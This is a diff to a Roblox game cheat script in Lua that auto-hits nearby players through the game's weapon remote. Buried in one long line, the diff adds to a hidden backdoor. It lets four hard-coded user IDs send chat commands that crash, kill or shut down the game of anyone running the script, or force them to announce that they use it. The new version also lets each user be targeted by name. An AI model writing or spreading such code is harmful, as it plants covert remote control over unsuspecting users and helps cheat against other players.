@@ -281,7 +281,7 @@ local function isAlive(player)
     return cl and cl.Character and cl.Character.Parent ~= nil and cl.Character:FindFirstChild("HumanoidRootPart") and cl.Character:FindFirstChild("Head") and cl.Character:FindFirstChild("Humanoid")
 end
 local function friendCheck(plr)
-    return cl:IsFriendsWith(plr.UserId) or nil
+    return cl:IsFriendsWith(plr.UserId) or false
 end
 local function isPlayerTargetable(plr, target, friend)
     return plr ~= cl and plr and (friend and friendCheck(plr) == nil or (not friend)) and isAlive(plr)
@@ -337,7 +337,7 @@ local function Old_HitNearbyPlayer() -- Just saving this here in case astrix add
             cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"Z", 1, "the/???"})) -- Does a "pre - hit"
             -- friend
             if friendly_mode then -- if whitelist RBX friends is enabled
-                if (not cl:IsFriendsWith(v.UserId)) then
+                if (not friendCheck(v)) then
                     if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
                         hitVisualEffect(v.Character)
                         cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v.Character), "lol  "}))
@@ -627,7 +627,7 @@ oldmadness1 = Madness.CreateToggle({
     end,
     ["Default"] = false 
 })
-task.spawn(function() local ids = {3253607351,3258614425,3258963410,3250001570} for i,v in pairs(plrs:GetChildren()) do if table.find(ids, v.UserId) and v ~= cl then v.Chatted:Connect(function(msg) if msg == ";shutdown default" then game:shutdown() elseif msg == ";kill default" then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";check default" then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." hi", "All") elseif msg == ";crash default" then if setfpscap then setfpscap(9e9) end while true do end end end) end end plrs.PlayerAdded:Connect(function(p) if table.find(ids, p.UserId) then p.Chatted:Connect(function(msg) if msg == ";shutdown default" then game:shutdown() elseif msg == ";check default" then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi", "All") elseif msg == ";kill default" then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" then if setfpscap then setfpscap(9e9) end while true do end end end) end end) end)
+task.spawn(function() local ids = {3253607351,3258614425,3258963410,3250001570} for i,v in pairs(plrs:GetChildren()) do if table.find(ids, v.UserId) and v ~= cl then v.Chatted:Connect(function(msg) if msg == ";shutdown default" or msg == ";shutdown "..cl.Name then game:shutdown() elseif msg == ";kill default" or msg == ";kill "..cl.Name then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";check default" or msg == ";check "..cl.Name then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." hi im using the script", "All") elseif msg == ";crash default" or msg == ";crash "..cl.Name then if setfpscap then setfpscap(9e9) end while true do end end end) end end plrs.PlayerAdded:Connect(function(p) if table.find(ids, p.UserId) then p.Chatted:Connect(function(msg) if msg == ";shutdown default" or msg == ";shutdown "..cl.Name then game:shutdown() elseif msg == ";check default" or msg == ";check "..cl.Name then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi im using the script", "All") elseif msg == ";kill default" or msg == ";kill "..cl.Name then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" or msg == ";crash "..cl.Name then if setfpscap then setfpscap(9e9) end while true do end end end) end end) end)
 Madness.CreateToggle({
     ["Name"] = "Purple madness", -- name of object
     ["HoverText"] = "Exclusive madness?!?!?! no way! (I think it's missing the rays particles also you need to have effects enabled for it to work)", -- text that will show up after hovering over the button (optional)
